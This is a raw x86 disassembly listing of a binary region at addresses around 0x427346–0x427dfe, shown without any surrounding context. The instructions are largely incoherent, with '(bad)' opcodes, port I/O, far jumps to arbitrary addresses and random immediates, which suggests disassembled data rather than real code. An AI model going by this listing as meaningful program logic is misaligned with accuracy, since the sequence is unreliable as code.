  427346:	mov    ah,0xd
  427348:	popf   
  427349:	cmp    eax,DWORD PTR [edi+0xc]
  42734c:	fwait
  42734d:	add    DWORD PTR [eax-0x64],ebp
  427350:	shl    DWORD PTR [eax+0x25f9bf88],0x62
  427357:	test   al,0x39
  427359:	je     0x427361
  42735b:	pop    ds
  42735c:	cmp    ch,ah
  42735e:	aas    
  42735f:	inc    ebx
  427360:	jle    0x4273a1
  427362:	sbb    esp,DWORD PTR [edx+0x3d6b36f5]
  427368:	xchg   BYTE PTR [edi],bl
  42736a:	mov    ch,0x4b
  42736c:	sub    ch,dl
  42736e:	pop    esp
  42736f:	lods   al,BYTE PTR ds:[esi]
  427370:	push   esp
  427371:	push   edi
  427372:	mov    ecx,0xf6da96e1
  427377:	imul   edi,DWORD PTR [edx],0xffffffe6
  42737a:	addr16 sub esi,esp
  42737d:	cmp    DWORD PTR [edx+0x2b],edi
  427380:	xchg   edx,eax
  427381:	push   0xd4b2b47f
  427386:	out    0x9f,eax
  427388:	jecxz  0x4273e7
  42738a:	push   esp
  42738b:	xor    DWORD PTR [edx+0x3ddad41b],eax
  427391:	xchg   esi,eax
  427392:	xchg   esi,eax
  427393:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427394:	dec    esp
  427395:	out    0xf5,al
  427397:	sub    eax,0xad1e3004
  42739c:	or     eax,0xa2c6288e
  4273a1:	pop    ecx
  4273a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4273a3:	popf   
  4273a4:	xor    esi,ecx
  4273a6:	push   esi
  4273a7:	jbe    0x427346
  4273a9:	jae    0x42739d
  4273ab:	scas   eax,DWORD PTR es:[edi]
  4273ac:	dec    ecx
  4273ad:	jne    0x4273d2
  4273af:	adc    ebx,DWORD PTR [eax+0x35e496c]
  4273b5:	inc    ebp
  4273b6:	icebp  
  4273b7:	jmp    DWORD PTR [ecx+eax*4+0x298f4392]
  4273be:	aam    0xc1
  4273c0:	mov    eax,ds:0x60
	...
  427431:	add    BYTE PTR [eax],al
  427433:	add    BYTE PTR [ecx+0x6f],ch
  427436:	mov    BYTE PTR [eax],cl
  427438:	mov    gs,edi
  42743a:	jmp    0xe38703ae
  42743f:	jmp    0xa1e4:0x6e4d9d68
  427446:	add    DWORD PTR [eax],eax
  427448:	test   BYTE PTR [eax],0x0
  42744b:	add    BYTE PTR [edi],cl
  42744d:	mov    ebx,0xbf5d7cbc
  427452:	ins    BYTE PTR es:[edi],dx
  427453:	push   edx
  427454:	inc    esp
  427455:	mov    al,BYTE PTR [ebx]
  427457:	xchg   esi,eax
  427458:	lds    ecx,FWORD PTR [ebp+ebp*2+0x57]
  42745c:	pop    edx
  42745d:	pop    edx
  42745e:	div    BYTE PTR [edx]
  427460:	ins    BYTE PTR es:[edi],dx
  427461:	jno    0x4274a5
  427463:	aaa    
  427464:	xor    al,0x42
  427466:	out    dx,al
  427467:	xchg   esp,eax
  427468:	cmp    edx,ecx
  42746a:	sbb    BYTE PTR [edx-0x15],0x7f
  42746e:	(bad)  
  42746f:	sub    eax,0xb8870025
  427474:	dec    esi
  427475:	sbb    bl,bh
  427477:	imul   BYTE PTR [edx+0x7e]
  42747a:	jp     0x427444
  42747c:	pushf  
  42747d:	jl     0x427406
  42747f:	pop    esp
  427480:	gs je  0x427433
  427483:	push   ecx
  427484:	adc    DWORD PTR [esi+ebp*1+0x47],ebx
  427488:	popf   
  427489:	cmp    bl,bh
  42748b:	js     0x427440
  42748d:	jb     0x4274cf
  42748f:	push   cs
  427490:	sub    esi,DWORD PTR [edi-0x53da550d]
  427496:	mov    dh,0x9f
  427498:	dec    ecx
  427499:	aad    0x34
  42749b:	gs inc edi
  42749d:	jb     0x427502
  42749f:	or     BYTE PTR [edi-0x61bb874d],ch
  4274a5:	cmc    
  4274a6:	popa   
  4274a7:	jmp    0x9d6d30c9
  4274ac:	arpl   WORD PTR [ebp+0x1f5dbff1],bx
  4274b2:	mov    dh,0xa4
  4274b4:	pop    ebp
  4274b5:	bound  eax,QWORD PTR [eax-0x5a7fef09]
  4274bb:	shl    DWORD PTR [eax],cl
  4274bd:	push   ecx
  4274be:	sahf   
  4274bf:	or     eax,0xddd30f5e
  4274c4:	mov    ch,0x80
  4274c6:	push   ecx
  4274c7:	inc    edi
  4274c8:	jae    0x4274f0
  4274ca:	test   BYTE PTR [edi-0x43],ch
  4274cd:	cdq    
  4274ce:	fstp   TBYTE PTR [edi-0x19]
  4274d1:	push   cs
  4274d2:	jnp    0x4274ac
  4274d4:	iret   
  4274d5:	mov    edi,0x550b1ac1
  4274da:	mov    al,al
  4274dc:	sbb    ebx,DWORD PTR [eax]
  4274de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4274df:	dec    esi
  4274e0:	xchg   esp,eax
  4274e1:	pop    ebx
  4274e2:	lock jo 0x42749b
  4274e5:	(bad)  
  4274e7:	mov    BYTE PTR [ebx+0x30],ch
  4274ea:	and    ah,al
  4274ec:	fdiv   QWORD PTR [edx+0x6e1ee79c]
  4274f2:	ficom  WORD PTR [ebp-0x4a86128e]
  4274f8:	dec    ebp
  4274f9:	jno    0x42748b
  4274fb:	int3   
  4274fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4274fd:	add    cl,BYTE PTR [ecx]
  4274ff:	mov    dh,BYTE PTR [ecx-0x47]
  427502:	or     bh,BYTE PTR [ebx-0x1afaf4c]
  427508:	mov    eax,0x2b884783
  42750d:	rcl    DWORD PTR [ecx],0x2
  427510:	sbb    eax,0xd8a39e4d
  427515:	adc    BYTE PTR [si-0x2c14],bl
  42751a:	into   
  42751b:	hlt    
  42751c:	sub    BYTE PTR [edx+0x246a5c33],dl
  427522:	ficom  DWORD PTR [edi]
  427524:	xor    bh,BYTE PTR [ebx]
  427526:	pushf  
  427527:	push   ecx
  427528:	out    0x1a,eax
  42752a:	cmp    dh,BYTE PTR [ebx+0x7e]
  42752d:	leavew 
  42752f:	daa    
  427530:	or     eax,0x1f1fe44d
  427535:	xor    eax,0x4ffebe8c
  42753a:	daa    
  42753b:	mov    WORD PTR [ecx+0x44f94901],?
  427541:	cmp    al,BYTE PTR [eax]
	...
  4275b3:	add    BYTE PTR [edx],dl
  4275b5:	retf   
  4275b6:	sbb    DWORD PTR [edx],0xcb9b5ad9
  4275bc:	mov    ds:0xc79a8b87,al
  4275c1:	jp     0x4275ae
  4275c3:	js     0x42759f
  4275c5:	mov    ds:0xf60001,al
  4275ca:	add    BYTE PTR [eax],al
  4275cc:	mov    DWORD PTR [esi],eax
  4275ce:	dec    esp
  4275cf:	leave  
  4275d0:	repz ds push esi
  4275d3:	pushf  
  4275d4:	sbb    DWORD PTR [eax],0xf824c17
  4275da:	cmc    
  4275db:	jmp    0x6db2f0ed
  4275e0:	aaa    
  4275e1:	neg    BYTE PTR [edx+esi*2+0x29df1ee0]
  4275e8:	cmp    BYTE PTR [edx-0x4c],cl
  4275eb:	fnstenvw [esi+ebx*2-0xd]
  4275f0:	imul   ecx,DWORD PTR [ebp-0x8],0x8daba28e
  4275f7:	and    al,0xe7
  4275f9:	jns    0x427637
  4275fb:	fistp  WORD PTR [eax]
  4275fd:	jle    0x4275df
  4275ff:	inc    edx
  427600:	xchg   ecx,eax
  427601:	jmp    0x427663
  427603:	cmp    cl,dl
  427605:	div    cl
  427607:	mov    DWORD PTR [eax+0x1049424f],edx
  42760d:	or     bl,BYTE PTR [edi+eiz*1+0xc]
  427611:	mov    eax,ds:0xa396b83f
  427616:	sbb    BYTE PTR [edi+0x6a],0xa1
  42761a:	sbb    cl,BYTE PTR [ecx+0x3b7694cd]
  427620:	inc    eax
  427621:	fistp  QWORD PTR [esi-0x3cfce3ef]
  427627:	pop    ebp
  427628:	inc    ebp
  427629:	sub    BYTE PTR [ecx+eiz*8-0x1ea4cb1b],dl
  427630:	fst    st(7)
  427632:	shl    DWORD PTR [esi],1
  427634:	xchg   edi,eax
  427635:	cli    
  427636:	inc    edx
  427637:	frstor [eax-0x35c3cc37]
  42763d:	aaa    
  42763e:	in     eax,dx
  42763f:	jle    0x42768d
  427641:	jbe    0x42763a
  427643:	fnstcw WORD PTR [edx+0x2b]
  427646:	sbb    eax,DWORD PTR [edx+0x3]
  427649:	or     dh,BYTE PTR [ecx]
  42764b:	fdiv   DWORD PTR [ebx]
  42764d:	dec    ecx
  42764e:	cs jno 0x42769b
  427651:	aad    0x19
  427653:	mov    eax,ds:0xd320e89a
  427658:	cmp    esi,DWORD PTR [ecx+eax*4]
  42765b:	shl    DWORD PTR [esi+eax*4-0x3e707abd],0x93
  427663:	fdivr  QWORD PTR [esi-0x39dc0831]
  427669:	arpl   WORD PTR [ecx],di
  42766b:	into   
  42766c:	out    dx,eax
  42766d:	(bad)  
  42766e:	leave  
  42766f:	inc    eax
  427670:	(bad)  
  427671:	or     cl,BYTE PTR [ecx-0x591228d5]
  427677:	mov    ecx,0x858d042e
  42767c:	dec    ebx
  42767d:	retf   0x7ef7
  427680:	repz bound ebp,QWORD PTR [eax]
  427683:	jns    0x427615
  427685:	psubusb mm2,QWORD PTR [ebx+0x3]
  427689:	maxps  xmm7,xmm6
  42768c:	dec    edx
  42768d:	push   0x32
  42768f:	in     eax,0x2b
  427691:	inc    esp
  427692:	mov    ch,0xe9
  427694:	ror    BYTE PTR [edx-0x5714e29d],0xf8
  42769b:	jae    0x42770b
  42769d:	es std 
  42769f:	enter  0x5256,0x35
  4276a3:	scas   al,BYTE PTR es:[edi]
  4276a4:	and    cl,ah
  4276a6:	(bad)  
  4276a7:	ins    DWORD PTR es:[edi],dx
  4276a8:	sbb    BYTE PTR [edx-0x41],ch
  4276ab:	and    dl,BYTE PTR [esp+esi*1+0x978cf4e]
  4276b2:	ins    BYTE PTR es:[edi],dx
  4276b3:	std    
  4276b4:	scas   al,BYTE PTR es:[edi]
  4276b5:	stos   BYTE PTR es:[edi],al
  4276b6:	out    dx,al
  4276b7:	ins    BYTE PTR es:[edi],dx
  4276b8:	push   0xffffff85
  4276ba:	jmp    0xc65d32b3
  4276bf:	jle    0x42767f
  4276c1:	enter  0x0,0x0
	...
  427731:	add    BYTE PTR [eax],al
  427733:	add    BYTE PTR [eax-0xd53173],bh
  427739:	imul   edi,esp,0xffffff9f
  42773c:	and    al,0x37
  42773e:	or     al,0x49
  427740:	mov    bh,0xa0
  427742:	inc    ebp
  427743:	push   ss
  427744:	shl    BYTE PTR [ebx+0xf60001],1
  42774a:	add    BYTE PTR [eax],al
  42774c:	fist   DWORD PTR [ebx-0x469a10ff]
  427752:	adc    DWORD PTR [ecx+0x5],0x4eefa399
  427759:	or     eax,0x8a8b9d8d
  42775e:	and    DWORD PTR [edx+0x78],edx
  427761:	and    al,0x5d
  427763:	pop    ss
  427764:	aas    
  427765:	out    dx,al
  427766:	lods   al,BYTE PTR ds:[esi]
  427767:	push   ebx
  427768:	or     al,0xa9
  42776a:	mov    dl,0xbc
  42776c:	push   esi
  42776d:	stc    
  42776e:	xchg   BYTE PTR [ebp-0x30],ah
  427771:	dec    esp
  427772:	mov    ebx,0x9c2a367b
  427777:	jge    0x427727
  427779:	repz mov esp,0x676492ab
  42777f:	jae    0x427747
  427781:	inc    ebp
  427782:	mov    esp,0x9ee63b51
  427787:	or     al,0x5a
  427789:	xor    DWORD PTR ds:0x44d43c1c,0x5367fc1
  427793:	sub    ebp,edx
  427795:	loop   0x4277f3
  427797:	shl    dl,0x52
  42779a:	jo     0x427736
  42779c:	(bad)  
  42779d:	cli    
  42779e:	mov    edx,0x4cbe7cfb
  4277a3:	inc    esp
  4277a4:	jle    0x427796
  4277a6:	lods   eax,DWORD PTR ds:[esi]
  4277a7:	jns    0x4277cf
  4277a9:	xor    BYTE PTR [ecx],0x3a
  4277ac:	adc    edi,edx
  4277ae:	bound  ebp,QWORD PTR ds:0x746b5464
  4277b4:	cwde   
  4277b5:	in     al,dx
  4277b6:	or     ah,BYTE PTR [eax+0x38]
  4277b9:	push   0x495525cc
  4277be:	cs or  edx,ebp
  4277c1:	clc    
  4277c2:	mov    ds:0xd9d9dc63,al
  4277c7:	adc    dh,BYTE PTR [edx-0x4e72f450]
  4277cd:	nop
  4277ce:	mov    esp,0x890b8188
  4277d3:	lahf   
  4277d4:	xchg   DWORD PTR [eax-0x3e1cb018],esp
  4277da:	xchg   esp,eax
  4277db:	xor    al,0xbf
  4277dd:	bound  edx,QWORD PTR [edi+0x5ef12f9a]
  4277e3:	test   DWORD PTR [ecx+0x5901879b],0x4da5422
  4277ed:	ja     0x427850
  4277ef:	pop    ebp
  4277f0:	and    BYTE PTR [edx+0x6c],0x7b
  4277f4:	pop    esp
  4277f5:	or     eax,0xb8ceb632
  4277fa:	loopne 0x427804
  4277fc:	mov    ah,0xa8
  4277fe:	inc    esi
  4277ff:	jmp    0x427862
  427801:	xchg   ecx,eax
  427802:	shl    BYTE PTR [eax+esi*8-0x5baa6901],1
  427809:	xor    dh,bh
  42780b:	cmc    
  42780c:	push   ds
  42780d:	rol    bh,cl
  42780f:	iret   
  427810:	out    0x1,eax
  427812:	in     al,dx
  427813:	mov    BYTE PTR [esi-0x48],bh
  427816:	mov    edi,0xfe7b3c25
  42781b:	push   edx
  42781c:	mov    ebx,0x8ef7add9
  427821:	call   0x2576:0x99f60595
  427828:	(bad)  
  427829:	fistp  DWORD PTR [eax]
  42782b:	push   cs
  42782c:	pop    ecx
  42782d:	adc    DWORD PTR [edi-0x23],eax
  427830:	jg     0x4277d7
  427832:	or     esi,DWORD PTR [ecx]
  427834:	fimul  WORD PTR [ebp+esi*2+0x662b1c5d]
  42783b:	and    eax,DWORD PTR [edx*8+0x103c3d2]
	...
  4278b2:	add    BYTE PTR [eax],al
  4278b4:	mov    WORD PTR [esi+0x7d],cs
  4278b7:	jge    0x4278b8
  4278b9:	jg     0x427847
  4278bb:	dec    DWORD PTR [eax-0x5e]
  4278be:	(bad)  
  4278bf:	xchg   ecx,eax
  4278c0:	repnz sbb bh,dh
  4278c3:	gs (bad) 
  4278c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4278c6:	add    DWORD PTR [eax],eax
  4278c8:	test   BYTE PTR [eax],0x0
  4278cb:	add    dh,bl
  4278cd:	mov    ah,0xed
  4278cf:	int3   
  4278d0:	stos   BYTE PTR es:[edi],al
  4278d1:	data16 jecxz 0x4278a4
  4278d4:	mov    bl,BYTE PTR [ecx+esi*4]
  4278d7:	add    cl,BYTE PTR [esi+0x19]
  4278da:	cs popa 
  4278dc:	shl    BYTE PTR [ebp+0x7b],0xec
  4278e0:	stos   DWORD PTR es:[edi],eax
  4278e1:	dec    edx
  4278e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4278e3:	imul   edx,DWORD PTR [ecx+0x32],0xffffffe9
  4278e7:	jo     0x42794d
  4278e9:	sahf   
  4278ea:	test   eax,0x11aec9e1
  4278ef:	cmp    al,0xbe
  4278f1:	xchg   ecx,eax
  4278f2:	lds    ebp,FWORD PTR [esi]
  4278f4:	cmp    eax,0x963cc3d5
  4278f9:	lea    esi,[edx+0x15]
  4278fc:	mov    ebp,0x2011f60b
  427901:	inc    eax
  427902:	lock pop ss
  427904:	pop    eax
  427905:	gs xor eax,0x60ef66a3
  42790b:	call   0x1bd5:0x597aec46
  427912:	stos   DWORD PTR es:[edi],eax
  427913:	cdq    
  427914:	(bad)  
  427915:	cmp    ah,BYTE PTR [edx]
  427917:	xchg   ebp,eax
  427918:	mov    eax,ds:0x26582529
  42791d:	stc    
  42791e:	call   0xb1e4f2c5
  427923:	scas   eax,DWORD PTR es:[edi]
  427924:	mov    ds:0x97e79599,al
  427929:	cdq    
  42792a:	mov    ds:0x5ec26bb4,al
  42792f:	sub    edx,eax
  427931:	add    dl,BYTE PTR [edx-0x5f]
  427934:	sti    
  427935:	sbb    eax,0xf57ca67c
  42793a:	cmp    eax,0x32ea8627
  427940:	push   edi
  427941:	jb     0x42792a
  427943:	outs   dx,DWORD PTR ds:[esi]
  427944:	or     ebx,edi
  427946:	sub    ah,ch
  427948:	retf   0x639
  42794b:	fist   DWORD PTR [edi]
  42794d:	lods   al,BYTE PTR ds:[esi]
  42794e:	jae    0x4278e1
  427950:	test   eax,0xf6dfab4c
  427955:	ds retf 0xcc20
  427959:	(bad)  
  42795a:	fsub   DWORD PTR [ebx]
  42795c:	or     DWORD PTR [edx-0x5a5a5dca],edx
  427962:	cmp    cl,BYTE PTR [ebx+esi*8+0x4331cdd7]
  427969:	iretw  
  42796b:	pop    esp
  42796c:	shl    bh,1
  42796e:	push   ebp
  42796f:	mov    ds:0x50f5baad,al
  427974:	das    
  427975:	push   cs
  427976:	sub    DWORD PTR [esi],edi
  427978:	inc    ebp
  427979:	adc    ecx,0xc7a5d87
  42797f:	std    
  427980:	test   BYTE PTR [esp+edi*4+0x50],dl
  427984:	stc    
  427985:	es jg  0x4279c2
  427988:	std    
  427989:	lds    ecx,FWORD PTR [esp+eiz*8]
  42798c:	mov    edx,0xb507f0f4
  427991:	in     al,dx
  427992:	enter  0x2dfd,0x5f
  427996:	add    DWORD PTR [ecx+0x5574f1d0],eax
  42799c:	enter  0x2af0,0xb2
  4279a0:	jns    0x427a16
  4279a2:	popa   
  4279a3:	fnstenv [ebp+0x8f7a595]
  4279a9:	(bad)  
  4279aa:	retf   
  4279ab:	inc    ecx
  4279ac:	jmp    0xc13479b7
  4279b1:	les    ebp,FWORD PTR [ebx]
  4279b3:	xor    BYTE PTR [ebp+0x71],dl
  4279b6:	cdq    
  4279b7:	xlat   BYTE PTR ds:[ebx]
  4279b8:	(bad)  
  4279b9:	cli    
  4279ba:	test   eax,0x6ffd903e
  4279bf:	repz (bad) 
  4279c1:	loopne 0x4279c3
	...
  427a33:	add    BYTE PTR [ecx-0x42a9f2d8],bl
  427a39:	ja     0x427a16
  427a3b:	out    dx,eax
  427a3c:	das    
  427a3d:	mov    ch,0xeb
  427a3f:	aam    0x7b
  427a41:	nop
  427a42:	rcl    DWORD PTR [esi],1
  427a44:	mov    esp,0xf60001a5
  427a49:	add    BYTE PTR [eax],al
  427a4b:	add    BYTE PTR [edx],bl
  427a4d:	cmp    DWORD PTR [eax+0x22],esp
  427a50:	push   ecx
  427a51:	popa   
  427a52:	loop   0x427a8e
  427a54:	and    al,0xa7
  427a56:	enter  0x8ecc,0xcd
  427a5a:	mov    ecx,0x2529c633
  427a5f:	adc    edx,DWORD PTR [ecx]
  427a61:	lods   al,BYTE PTR ds:[esi]
  427a62:	push   0xffffff99
  427a64:	push   ecx
  427a65:	and    eax,0x36982c9f
  427a6a:	and    BYTE PTR [edi],dh
  427a6c:	add    bh,BYTE PTR [edi+ebx*4-0x60ba549b]
  427a73:	ja     0x427a8e
  427a75:	scas   eax,DWORD PTR es:[edi]
  427a76:	jmp    0x73812a
  427a7b:	js     0x427a9b
  427a7d:	aad    0x2b
  427a7f:	pop    esp
  427a80:	test   eax,0x458f11ad
  427a85:	jge    0x427a5f
  427a87:	push   ds
  427a88:	sbb    eax,DWORD PTR [esi+0x7cc1c752]
  427a8e:	pop    edi
  427a8f:	imul   edx,ebx,0x79
  427a92:	pop    ebx
  427a93:	hlt    
  427a94:	ins    DWORD PTR es:[edi],dx
  427a95:	pop    ebx
  427a96:	xchg   edx,eax
  427a97:	mov    ds:0xdc3b4df2,eax
  427a9c:	ins    BYTE PTR es:[edi],dx
  427a9d:	pop    edi
  427a9e:	es mov edx,0x7259b17
  427aa4:	xor    al,BYTE PTR [edx+esi*1]
  427aa7:	int3   
  427aa8:	push   esp
  427aa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427aaa:	mov    al,ds:0x79e941fc
  427aaf:	xchg   ebx,eax
  427ab0:	jl     0x427a9f
  427ab2:	into   
  427ab3:	int    0xa
  427ab5:	faddp  st(2),st
  427ab7:	ins    BYTE PTR es:[edi],dx
  427ab8:	cmp    edx,ebx
  427aba:	test   dh,bh
  427abc:	pop    edi
  427abd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427abe:	pop    eax
  427abf:	push   ds
  427ac0:	daa    
  427ac1:	and    eax,0x448a5f41
  427ac6:	rcl    bh,0x77
  427ac9:	mov    esp,0x5dcc1c0e
  427ace:	jnp    0x427b2e
  427ad0:	xlat   BYTE PTR ds:[ebx]
  427ad1:	jne    0x427b27
  427ad3:	pop    edi
  427ad4:	test   eax,0x33c53de
  427ad9:	call   0x6ec3:0x4edf8d3f
  427ae0:	stos   BYTE PTR es:[edi],al
  427ae1:	dec    ebx
  427ae2:	xchg   ebp,eax
  427ae3:	pop    eax
  427ae4:	dec    eax
  427ae5:	cmp    al,0xed
  427ae7:	or     BYTE PTR [ebx-0x43],dl
  427aea:	adc    ch,bh
  427aec:	int3   
  427aed:	cdq    
  427aee:	jmp    ebx
  427af0:	mov    cl,BYTE PTR [esi+0x6fdc3207]
  427af6:	les    eax,FWORD PTR [ecx+0x21]
  427af9:	adc    al,0x7
  427afb:	mov    edx,DWORD PTR [esi-0x21223eb]
  427b01:	jl     0x427a94
  427b03:	fimul  DWORD PTR [edi+0x11]
  427b06:	xchg   edi,eax
  427b07:	and    ecx,DWORD PTR [ebp+0x17]
  427b0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b0b:	cli    
  427b0c:	xchg   ebp,eax
  427b0d:	popa   
  427b0e:	shl    BYTE PTR [edi-0x73c02690],0x9b
  427b15:	mov    ss,WORD PTR ds:0x66069dee
  427b1b:	mov    ebp,0x2ac1ea3c
  427b20:	mov    al,ds:0x2e70f91b
  427b25:	jp     0x427b32
  427b27:	jmp    0x2d6f5971
  427b2c:	(bad)  
  427b2d:	jl     0x427b12
  427b2f:	add    DWORD PTR [edi],edx
  427b31:	sar    BYTE PTR [edi],1
  427b33:	add    al,0xf1
  427b35:	(bad)  
  427b36:	clc    
  427b37:	stos   BYTE PTR es:[edi],al
  427b38:	xchg   ebp,eax
  427b39:	not    BYTE PTR [esi-0x5f]
  427b3c:	stos   DWORD PTR es:[edi],eax
  427b3d:	push   esi
  427b3e:	dec    edx
  427b3f:	sub    eax,0x1f69
	...
  427bb4:	loop   0x427c16
  427bb6:	test   DWORD PTR [esi+0x74f3f787],esi
  427bbc:	mov    eax,0x6414fe65
  427bc1:	and    edi,ebx
  427bc3:	xchg   esi,eax
  427bc4:	mov    dl,0xa6
  427bc6:	add    DWORD PTR [eax],eax
  427bc8:	test   BYTE PTR [eax],0x0
  427bcb:	add    BYTE PTR [esi-0x7d],al
  427bce:	and    dh,al
  427bd0:	mov    edx,0x6f980e3e
  427bd5:	and    eax,0xa872d48c
  427bda:	imul   eax,DWORD PTR [eax+0x56],0xffffffb0
  427bde:	xchg   DWORD PTR [esi+0x66224150],ebp
  427be4:	sub    al,0xb1
  427be6:	and    esp,ebp
  427be8:	pusha  
  427be9:	(bad)  
  427bea:	mov    bh,0xd
  427bec:	sub    BYTE PTR [ebp+0x6b],bh
  427bef:	sbb    edi,DWORD PTR [ecx-0x2e]
  427bf2:	inc    esi
  427bf3:	out    dx,al
  427bf4:	hlt    
  427bf5:	sbb    ebp,DWORD PTR [eax+0x36]
  427bf8:	mov    ebp,0x9f72932
  427bfd:	fdiv   QWORD PTR [ebp-0x29]
  427c00:	rcl    DWORD PTR [ebx+0x52],0x43
  427c04:	or     ecx,DWORD PTR [esi+0xb]
  427c07:	test   DWORD PTR [eax-0x64],eax
  427c0a:	jle    0x427be7
  427c0c:	add    esi,DWORD PTR [ecx]
  427c0e:	sub    al,0x77
  427c10:	mov    ah,0x1b
  427c12:	neg    BYTE PTR ds:[eax+edx*8-0x5003137a]
  427c1a:	mov    ds:0xdc7381e,eax
  427c1f:	gs mov cl,0xe1
  427c22:	fidivr WORD PTR [ecx-0x5c7ec82c]
  427c28:	repnz mov eax,0x936e4487
  427c2e:	jp     0x427c3f
  427c30:	dec    edi
  427c31:	lods   al,BYTE PTR ds:[esi]
  427c32:	dec    BYTE PTR [esi+ebp*1-0x526a05b5]
  427c39:	sbb    ch,BYTE PTR [ebp-0x11a52683]
  427c3f:	fldenv ds:0xad96f6c7
  427c45:	les    ebp,FWORD PTR [esi-0x5]
  427c48:	(bad)  
  427c49:	pop    ss
  427c4a:	pop    esp
  427c4b:	out    0x54,eax
  427c4d:	std    
  427c4e:	inc    esi
  427c4f:	xchg   ecx,eax
  427c50:	sub    ch,BYTE PTR ds:0xe48633eb
  427c56:	cmp    ch,BYTE PTR [edi+0x16]
  427c59:	enter  0x4c67,0xc
  427c5d:	mul    DWORD PTR [ebp+0x15defbc5]
  427c63:	mov    dh,0xec
  427c65:	in     eax,dx
  427c66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c67:	mov    dl,0x33
  427c69:	xor    al,0x8a
  427c6b:	and    dh,cl
  427c6d:	pop    ds
  427c6e:	jmp    DWORD PTR [esi]
  427c70:	xor    al,cl
  427c72:	bound  edi,QWORD PTR [edi+0x4a]
  427c75:	loopne 0x427c72
  427c77:	nop
  427c78:	mov    ecx,0x6ac2a9f9
  427c7d:	stos   DWORD PTR es:[edi],eax
  427c7e:	dec    ebp
  427c7f:	push   esp
  427c80:	bound  esp,QWORD PTR [edx]
  427c82:	mov    BYTE PTR [eax-0x7b],0x7f
  427c86:	dec    esp
  427c87:	int    0x50
  427c89:	sub    BYTE PTR [edi],ah
  427c8b:	sbb    al,0xc8
  427c8d:	inc    esi
  427c8e:	xchg   ebp,eax
  427c8f:	push   ebx
  427c90:	xchg   esp,eax
  427c91:	push   eax
  427c92:	inc    eax
  427c93:	jnp    0x427c8a
  427c95:	dec    eax
  427c96:	sub    BYTE PTR [edx+0x3d3fe812],bl
  427c9c:	push   edi
  427c9d:	xchg   ebx,eax
  427c9e:	and    al,0x4f
  427ca0:	ror    DWORD PTR [edx-0x37],0xbb
  427ca4:	jg     0x427ca4
  427ca6:	xchg   ebp,eax
  427ca7:	out    dx,eax
  427ca8:	cmp    ecx,DWORD PTR [esi+0x41]
  427cab:	ret    0x76ea
  427cae:	mov    edx,0x7c1752c7
  427cb3:	sbb    edx,ebp
  427cb5:	gs ss jl 0x427cb8
  427cb9:	sub    BYTE PTR [ebx],bh
  427cbb:	adc    bh,cl
  427cbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427cbe:	jmp    0x0:0x9a9a35
	...
  427d31:	add    BYTE PTR [eax],al
  427d33:	add    BYTE PTR [edx],cl
  427d35:	mov    cl,0x61
  427d37:	repz sti 
  427d39:	repz call 0xfa1:0xdc63ecf9
  427d41:	enter  0xa3cd,0xa8
  427d45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427d46:	add    DWORD PTR [eax],eax
  427d48:	test   BYTE PTR [eax],0x0
  427d4b:	add    ch,ch
  427d4d:	outs   dx,DWORD PTR ds:[esi]
  427d4e:	mov    eax,ds:0xf41c8e4e
  427d53:	jno    0x427d4c
  427d55:	jnp    0x427cdc
  427d57:	retf   0xc5d5
  427d5a:	pop    es
  427d5b:	and    eax,esp
  427d5d:	jecxz  0x427d3a
  427d5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427d60:	fdiv   QWORD PTR [ecx]
  427d62:	fidivr DWORD PTR [edx+0x78]
  427d65:	xchg   edx,eax
  427d66:	jecxz  0x427cec
  427d68:	ss cmc 
  427d6a:	aas    
  427d6b:	dec    edx
  427d6c:	sub    al,0x94
  427d6e:	ja     0x427d75
  427d70:	out    0xd1,al
  427d72:	ud1    eax,DWORD PTR [edi+0x31]
  427d76:	pop    es
  427d77:	and    BYTE PTR [eax],dh
  427d79:	pop    ebp
  427d7a:	mov    cl,0xe4
  427d7c:	out    0x95,eax
  427d7e:	sbb    ebp,DWORD PTR [edi+0x34a45a6b]
  427d84:	jmp    0x101c:0xa641ce44
  427d8b:	mov    ch,0x62
  427d8d:	(bad)  
  427d8e:	xchg   esi,eax
  427d8f:	shl    edi,cl
  427d91:	(bad)  
  427d92:	out    0xf7,eax
  427d94:	xchg   ebp,eax
  427d95:	dec    ecx
  427d96:	ss jb  0x427d59
  427d99:	adc    eax,ebx
  427d9b:	inc    ebp
  427d9c:	push   esi
  427d9d:	mov    ch,0x7f
  427d9f:	leave  
  427da0:	jo     0x427e14
  427da2:	adc    al,0xdd
  427da4:	std    
  427da5:	dec    ecx
  427da6:	dec    esp
  427da7:	add    eax,0xb68a319a
  427dac:	adc    esp,DWORD PTR [esi+ecx*1-0x70]
  427db0:	inc    edx
  427db1:	mov    al,0xcc
  427db3:	inc    esp
  427db4:	inc    esp
  427db5:	dec    eax
  427db6:	xchg   edx,eax
  427db7:	cwde   
  427db8:	add    ebx,esp
  427dba:	xor    BYTE PTR [ecx-0x3d],ch
  427dbd:	cwde   
  427dbe:	push   ss
  427dbf:	push   0xffffffbf
  427dc1:	addr16 mov ebp,0x85170e18
  427dc7:	and    BYTE PTR [edx+0x2c],dl
  427dca:	cmc    
  427dcb:	add    ah,BYTE PTR [ecx-0x57a3b95b]
  427dd1:	jle    0x427d83
  427dd3:	fiadd  DWORD PTR [esi+eax*2-0x407179ad]
  427dda:	push   ss
  427ddb:	pusha  
  427ddc:	xchg   ebx,eax
  427ddd:	mov    cl,0xba
  427ddf:	mov    edx,0x53ea892d
  427de4:	inc    ebp
  427de5:	shr    DWORD PTR [eax],0x75
  427de8:	add    al,0x22
  427dea:	xor    DWORD PTR [edx+0x107fc421],ecx
  427df0:	in     al,dx
  427df1:	push   esp
  427df2:	pop    ebp
  427df3:	pop    ss
  427df4:	shr    BYTE PTR [ecx-0x7bb7c4af],1
  427dfa:	(bad)  
  427dfb:	stc    
  427dfc:	mov    ah,0x8f
  427dfe:	xor    cl,BYTE PTR [esi]
